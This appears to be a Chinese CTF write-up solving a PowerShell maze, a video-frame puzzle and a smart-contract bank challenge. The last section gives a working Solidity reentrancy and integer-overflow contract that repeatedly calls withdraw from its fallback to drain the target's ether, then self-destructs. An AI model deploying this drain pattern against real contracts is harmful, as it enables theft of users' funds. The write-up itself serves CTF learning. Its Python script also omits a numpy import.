# Akiz

## PowerShell 迷宫

官方题解实在是太慢啦！竟然要将近4分钟才能得到结果什么的（

下面这个方法只要数十秒就可以找到啦w

```powershell
function recursive($path, $max)
{
    foreach ($item in @(Get-ChildItem $path))
    {
        $x = $item.X
    	$y = $item.Y
        $flag = $item.Flag
        if ($flag -ne $null) { 
            Write-Host ""
            Write-Host "$flag"
            $end = Get-Date
            Write-Host ('Total Runtime: ' + ($end - $start).TotalSeconds)
            exit 
        }
    	if ($x -eq $max) { return }
    	if ($y -eq $max) { return }
    	if ($array[$x, $y] -ne 1) { 
            $array[$x, $y] = 1 
            Write-Host -NoNewline "."
        	recursive $item.PSPath $max 
        }
    }
}

$start = Get-Date
$array=New-Object 'int[,]' 70, 70
recursive (Resolve-Path Down).ProviderPath 70

```
输出（比隔壁官方writeup快多了www）
```
............................
flag{...
Total Runtime: 12.7551591
```
## 三教奇妙夜

用cv2分析视频，选取特定点为黑色的所有帧相加，肉眼/Tesseract识别一下即可。

```python
import cv2

def main():

    videoCapture = cv2.VideoCapture()
    videoCapture.open('output.mp4')
    frames = videoCapture.get(cv2.CAP_PROP_FRAME_COUNT)
    final = numpy.ndarray(shape=(240, 320, 3))
    
    for i in range(int(frames)):
        ret, frame = videoCapture.read()
        e = frame[200,300,0]
        if i % 10000 == 0:
            print(i)
        if e == 0:
            print(e)
            cv2.imwrite("Frame.(%d).jpg" % i, frame)
            final += frame
            cv2.imwrite("final.jpg", final)

main()


```

## 韭菜银行

### flag1

直接打开合约地址即可知道secret，再调用一下get_flag_1即可。

### flag2

死活找不到flag2所需要的user_id到底在哪里23333，最后的最后才看到公告“不要忽略打开/下载题目按钮”...

重入攻击+整数溢出即可。（甚至还能把合约里的keth提空

```solidity
pragma solidity ^0.4.26;

contract JCBank {
    mapping (address => uint) public balance;
    mapping (uint => bool) public got_flag;
    uint128 secret;
    function deposit() public payable;
    function withdraw(uint amount) public;
    function get_flag_1(uint128 guess) public view returns(string);
    function get_flag_2(uint user_id) public;
}

contract Attacker {
    
    JCBank target;
    address self;
    uint price;
    address owner = 0xE575c9abD35Fa94F1949f7d559056bB66FddEB51;

    constructor () public payable{ target = JCBank(owner);  price = address(this).balance; self = msg.sender; }
    function deposit() public payable { target.deposit.value(price)(); }
    function withdraw() public payable { target.withdraw(price); target.withdraw(price); }
    function finally() public payable { self.transfer(address(this).balance); selfdestruct(msg.sender); }
    function flag(uint userid) public { target.get_flag_2(userid); }
    function () public payable { 
        if (msg.sender != owner) { return; } else { 
            if (price < address(owner).balance) { target.withdraw(price); 
            } else { target.withdraw(address(owner).balance);  return; }
        } 
    }
}

```

![L513SMUbaOg8uxf.png](https://i.loli.net/2019/10/22/d1pXV4QOg2EeLko.png)
